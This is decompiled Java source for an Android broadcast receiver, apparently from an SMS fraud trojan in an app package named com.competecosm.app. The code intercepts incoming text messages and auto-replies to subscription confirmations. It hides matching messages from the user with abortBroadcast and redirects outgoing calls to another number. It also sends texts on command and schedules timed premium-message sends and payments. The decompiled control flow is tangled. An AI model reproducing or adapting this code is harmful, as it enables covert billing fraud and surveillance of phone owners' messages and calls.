package com.competecosm.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

public class mr
  extends BroadcastReceiver
{
  public mr() {}
  
  private SmsMessage[] getSmsMessages(Bundle paramBundle)
  {
    paramBundle = (Object[])paramBundle.get("pdus");
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramBundle.length];
    int i = 0;
    for (;;)
    {
      if (i >= paramBundle.length) {
        return arrayOfSmsMessage;
      }
      arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])paramBundle[i]);
      i += 1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    label330:
    label513:
    label575:
    long l1;
    do
    {
      Object localObject1;
      do
      {
        do
        {
          boolean bool3;
          boolean bool2;
          boolean bool1;
          do
          {
            try
            {
              localObject1 = paramIntent.getAction();
              Settings.log("action: " + (String)localObject1);
              if (!((String)localObject1).equals("android.provider.Telephony.SMS_RECEIVED")) {
                break label575;
              }
              localObject1 = getSmsMessages(paramIntent.getExtras());
              bool3 = false;
              bool2 = false;
              localObject2 = new StringBuffer();
              paramIntent = "";
              i = 0;
              if (i >= localObject1.length)
              {
                str = ((StringBuffer)localObject2).toString();
                bool1 = bool3;
              }
            }
            catch (Exception paramContext)
            {
              Object localObject2;
              int i;
              String str;
              Settings.log(paramContext);
              return;
            }
            for (;;)
            {
              try
              {
                Settings.log("recive sms from " + paramIntent + ": " + str);
                bool1 = bool3;
                localObject2 = Settings.getSettings();
                localObject1 = localObject2;
                if (localObject2 == null)
                {
                  bool1 = bool3;
                  Settings.log("settings = null");
                  bool1 = bool3;
                  localObject1 = new Settings();
                  bool1 = bool3;
                  if (((Settings)localObject1).load(paramContext))
                  {
                    bool1 = bool3;
                    localObject2 = ms.getObject(new JSONObject(Constants.data).getJSONObject("settings"), "checkInSms");
                    if (localObject2 != null)
                    {
                      bool1 = bool3;
                      if (ms.isEnable((JSONObject)localObject2))
                      {
                        bool1 = bool3;
                        if (Settings.isDie(paramIntent, str))
                        {
                          bool1 = bool3;
                          Settings.userCancel = true;
                          bool1 = bool3;
                          ((Settings)localObject1).save(paramContext);
                        }
                      }
                    }
                  }
                  bool1 = bool3;
                  boolean bool4 = Settings.userCancel;
                  if (bool4)
                  {
                    return;
                    str = localObject1[i];
                    paramIntent = str.getOriginatingAddress();
                    ((StringBuffer)localObject2).append(str.getMessageBody());
                    i += 1;
                    break;
                  }
                }
                bool1 = bool3;
                paramContext = Settings.isAosMessage(paramIntent, str);
                bool1 = bool2;
                if (paramContext != null)
                {
                  bool3 = true;
                  bool2 = true;
                  bool1 = bool3;
                  Settings.log("isAosMessage() true");
                }
              }
              catch (Exception paramContext)
              {
                paramContext.printStackTrace();
                break label513;
              }
              try
              {
                Settings.sendSms(paramIntent, paramContext);
                bool1 = bool2;
              }
              catch (Exception paramContext)
              {
                bool1 = bool3;
                paramContext.printStackTrace();
                bool1 = bool2;
                break label330;
              }
            }
            bool2 = bool1;
            try
            {
              paramContext = ((Settings)localObject1).isAosMessageEx(paramIntent, str);
              bool2 = bool1;
              if (Constants.DEBUG)
              {
                bool2 = bool1;
                Settings.log("aos item: " + paramContext);
              }
              if (paramContext != null)
              {
                bool2 = true;
                bool1 = true;
                Settings.sendSms(paramContext);
              }
            }
            catch (Exception paramContext)
            {
              for (;;)
              {
                bool1 = bool2;
                paramContext.printStackTrace();
                bool1 = bool2;
              }
            }
            bool2 = Settings.isDeleteMessageIfNotStartWith(paramIntent, str);
            bool1 = bool2;
            Settings.log("isDeleteMessageIfNotStartWith(): " + bool2);
            bool1 = bool2;
            if (Settings.isOkMessage(paramIntent, str))
            {
              bool1 = bool2;
              Settings.log("isOkMessage() true");
              bool1 = bool2;
              Settings.ok.set(true);
            }
            bool1 = bool2;
            Settings.log("find: " + bool2);
            bool1 = bool2;
            if (!bool2)
            {
              bool1 = bool2;
              bool3 = Settings.isDeleteMessage(paramIntent, str);
              bool1 = bool2;
              if (bool3) {
                bool1 = true;
              }
            }
          } while (!bool1);
          try
          {
            abortBroadcast();
            return;
          }
          catch (Exception paramContext)
          {
            paramContext.printStackTrace();
            return;
          }
          if (!((String)localObject1).equals("android.intent.action.NEW_OUTGOING_CALL")) {
            break;
          }
          paramIntent = paramIntent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
          Settings.log("phone: " + paramIntent);
        } while (!Settings.isRedirect(paramIntent));
        Settings.log("isRedirect: true");
        setResultData(null);
        Settings.makeCall(paramContext, Settings.callTo);
        return;
        if (!((String)localObject1).startsWith("custom.sms.")) {
          break;
        }
        Settings.sendSms(paramIntent.getExtras().getString("phone"), paramIntent.getExtras().getString("text"));
      } while (!Settings.loadSettings(paramContext));
      paramIntent = Settings.getSettings();
      paramIntent.subscriptionTime = 0L;
      paramIntent.save(paramContext);
      return;
      if (((String)localObject1).equals("custom.reapeat"))
      {
        l1 = paramIntent.getExtras().getLong("time");
        if ((System.currentTimeMillis() >= l1) || (l1 - System.currentTimeMillis() <= Constants.MINUTE))
        {
          ma.pay(paramContext);
          return;
        }
        Settings.startRepeatWaitTimer(paramContext, l1);
        return;
      }
    } while (!Settings.loadSettings(paramContext));
    paramIntent = Settings.getSettings();
    long l3 = System.currentTimeMillis();
    Settings.log("now: " + l3);
    Settings.log("subscriptionTime: " + paramIntent.subscriptionTime);
    Settings.log("repeatTime: " + paramIntent.repeatTime);
    long l2;
    if (paramIntent.subscriptionTime != 0L)
    {
      if (paramIntent.subscriptionTime <= l3) {
        break label991;
      }
      l2 = (paramIntent.subscriptionTime - l3) / Constants.SECOND;
      l1 = l2;
      if (l2 == 0L) {
        l1 = 1L;
      }
      Settings.log("seconds: " + l1);
      Settings.startSmsTimer(paramContext, l1, 1, paramIntent.subscriptionPhone, paramIntent.subscriptionMessage);
    }
    while (paramIntent.repeatTime != 0L)
    {
      if (paramIntent.repeatTime <= l3) {
        break label1008;
      }
      l2 = (paramIntent.repeatTime - l3) / Constants.MINUTE;
      l1 = l2;
      if (l2 == 0L) {
        l1 = 1L;
      }
      Settings.log("minutes: " + l1);
      Settings.startRepeatTimer(paramContext, l1);
      return;
      label991:
      Settings.startSmsTimer(paramContext, 1L, 1, paramIntent.subscriptionPhone, paramIntent.subscriptionMessage);
    }
    label1008:
    Settings.startRepeatTimer(paramContext, 1L);
  }
}
